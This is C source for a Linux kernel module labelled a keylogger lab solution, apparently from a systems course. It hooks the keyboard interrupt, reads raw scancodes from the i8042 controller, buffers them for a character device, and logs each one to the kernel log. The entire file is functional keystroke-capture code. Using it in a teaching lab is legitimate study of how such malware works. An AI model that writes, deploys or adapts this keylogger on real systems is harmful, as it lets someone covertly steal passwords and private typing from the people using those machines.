#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/major.h>
#include <linux/cdev.h>
#include <linux/fs.h>
#include <linux/interrupt.h>
#include <linux/semaphore.h>
#include <linux/uaccess.h>

#include "common.h"

#define KEYBOARD_IRQ		0x01
#define I8042_STATUS_REG	0x64
#define I8042_DATA_REG		0x60
#define RING_BUFFER_SIZE	128

/* Structs and prototypes */
struct key_device {
	struct cdev cdev;
	struct semaphore sem;
	unsigned int rring_idx;
	unsigned int wring_idx;
	unsigned short ring_buf[RING_BUFFER_SIZE];
};

static ssize_t key_read(struct file* filp, char __user* buf, size_t size, loff_t* offset);
static int register_dev(void);
static irqreturn_t int_handler(int irq_nr, void* dev_id);

/* Global vars */
struct key_device kdev;
static struct file_operations key_ops = {
	.owner = THIS_MODULE,
	.read = key_read,
};


static int __init mod_start(void) {
	int err;
	err = register_dev();
	if (err != 0) {
		return err;
	}

	err = request_irq(KEYBOARD_IRQ, int_handler, IRQF_SHARED, "ghostboard", (void*)&kdev);
	if (err != 0) {
		printk(KERN_ALERT "Failed to request IRQ: %d\n", err);
		cdev_del(&kdev.cdev);
		unregister_chrdev_region(MKDEV(KEY_MAJ, KEY_MIN), 1);
		return err;
	}

	return 0;
}

static void __exit mod_stop(void) {
	printk(KERN_ALERT "Goodbye, World\n");
	free_irq(KEYBOARD_IRQ, (void*)&kdev);
	cdev_del(&kdev.cdev);
	unregister_chrdev_region(MKDEV(KEY_MAJ, KEY_MIN), 1);

	return;
}

int register_dev(void) {
	int err;
	err = register_chrdev_region(MKDEV(KEY_MAJ, KEY_MIN), 1, "ghostboard");
	if (err != 0) {
		printk(KERN_ALERT "Could not register region (%d,%d)\n", KEY_MAJ, KEY_MIN);
		return err;
	}

	cdev_init(&kdev.cdev, &key_ops);
	err = cdev_add(&kdev.cdev, MKDEV(KEY_MAJ, KEY_MIN), 1);
	if (err != 0) {
		printk(KERN_ALERT "Error adding char device: %d\n", err);
		return err;
	}
	kdev.wring_idx = 0;
	kdev.rring_idx = 0;
	sema_init(&kdev.sem, 0);

	return 0;
}

ssize_t key_read(struct file* filp, char __user* buf, size_t size, loff_t* offset) {
	unsigned short keycode;
	
	if (down_interruptible(&kdev.sem) == -EINTR) {
		return -EINTR;
	}
	keycode = kdev.ring_buf[kdev.rring_idx % RING_BUFFER_SIZE];

	if (copy_to_user((void*)buf, (void*)&keycode, sizeof(keycode)) != 0) {
		return 0;
	}
	kdev.rring_idx++;

	return sizeof(unsigned short);
}

irqreturn_t int_handler(int irq_nr, void* dev_id) {
	struct key_device* dev = (struct key_device*)dev_id;
	unsigned short keycode;

	keycode = (inb(I8042_STATUS_REG) << 8) | inb(I8042_DATA_REG);
	dev->ring_buf[dev->wring_idx % RING_BUFFER_SIZE] = keycode;
	printk(KERN_ALERT "Code: %04x\n", keycode);
	dev->wring_idx++;
	up(&dev->sem);

	return IRQ_NONE;
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Mark O'Neill");
MODULE_DESCRIPTION("Keylogger (interrupt) Lab Solution");
module_init(mod_start);
module_exit(mod_stop); 
